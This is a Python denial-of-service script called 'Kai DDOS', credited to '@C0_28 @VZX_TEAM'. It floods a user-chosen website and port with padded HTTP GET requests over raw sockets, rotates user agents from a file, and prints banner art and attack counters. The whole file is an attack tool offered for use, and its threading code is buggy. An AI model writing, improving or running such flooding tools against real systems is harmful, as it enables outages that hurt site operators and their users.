import argparse
import threading
import time
import re
import requests
from socket import socket
from socket import *

from random import randrange
from termcolor import colored

from cfonts import render
from time import sleep
import os 

from random import *


F = '\033[2;32m'
Z = '\033[1;31m'
X = '\033[1;33m' 
F = '\033[2;32m'
A = '\033[2;34m'
C = '\033[2;35m' 
B = '\033[2;36m'
Y = '\033[1;34m' 
G = ['red','green','blue']
v = str(choice(G))
b = str(choice(G))
k = str(choice(G))

connect = 0

def vb():
	ar = render('KAY',colors=[v, b, k],align='center')
	for ar in ar.splitlines():
		sleep(0.10)
		print(ar)

def parse_args():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u','--user_agents',
                        dest = "user_agents",
                        help = "Filename of user agents file",
                        default = "user_agents.txt",
                        required = False)
    parser.add_argument('-t','--target',
                        dest = "target",
                        help = "Target website",
                        default = "http://example.com",
                        required = True)
    parser.add_argument('-tr','--threads',
                        dest = "threads",
                        help = "Number of threads",
                        default = 1000,
                        required = True)
    parser.add_argument('-s','--sleep',
                        dest = "sleep",
                        help = "Breakpoint after number of threads processed",
                        default = 100,
                        required = True)
    parser.add_argument('-p','--port',
                        dest = "port",
                        help = "Test Of Port (80)",
                        default = 80,
                        required = True)
    return parser.parse_args()
    
def get_user_agents(filename: str):
    user_agents = []
    with open(filename, 'r') as f:
        content = f.readlines()
        for user_agent in content:
            user_agents.append(str(user_agent.strip()))
    return user_agents
    
def flood(user_agent: str, target: str, port: int, threads: int):
    try:
    	hi = 0
    	sock = socket(AF_INET,SOCK_STREAM)
    	sock.connect((target,port))
    	try:
    		a = 0
    		d = 10
    		f = 15
    		h = 120
    		a = a + 1 + d + f + h
    		array = "shsgsjgdnxbslwheowgdhgaq(=($):/)&7dhwodhdjdg"
    		array = array * a * a
    		for i in array:
    			packet = str("GET / HTTP/1.1\nHost: "+target+"\n\n User-Agent: "+ user_agent +"\n"+array).encode('utf-8')
    			i = str(i).encode("utf-8")
    			sock.sendto(packet,(target,port))
    			global connect
    			connect +=1
    			print(colored(f"attacks [{connect}] Facked Attack port[{port}] server[{target}] Status[True]",'cyan'))
    			print(colored("Finishing Attacks CTRUL+Z .....",'yellow'))
    	except Exception as err:
        	pass
    except Exception as err:
        print(colored(f"Please Enter Hostname",'red'))
        exit()
        		
def main():
    os.system('clear')
    vb()
    print(colored("Kai DDOS", 'yellow'))
    print(colored("Authors: @C0_28 @VZX_TEAM\n\n", 'yellow'))
    ua_filename = parse_args().user_agents
    user_agents = get_user_agents(ua_filename)
    target = parse_args().target
    threads = int(parse_args().threads)
    sleep = int(parse_args().sleep)
    port = int(parse_args().port)
    ddos_list = []
    for i in range(threads):
    	user_agent = user_agents[randrange(len(user_agents) - 1)]
    	t = threading.Thread(flood(user_agent, target, port,threads))
    	t.start()
    	ddos_list.append(t)
    for i in ddos_list:
    	i.join()
    	print()
    	print(colored("Finished!", 'green'))
    	print()
    	exit()
if __name__ == "__main__":
    main()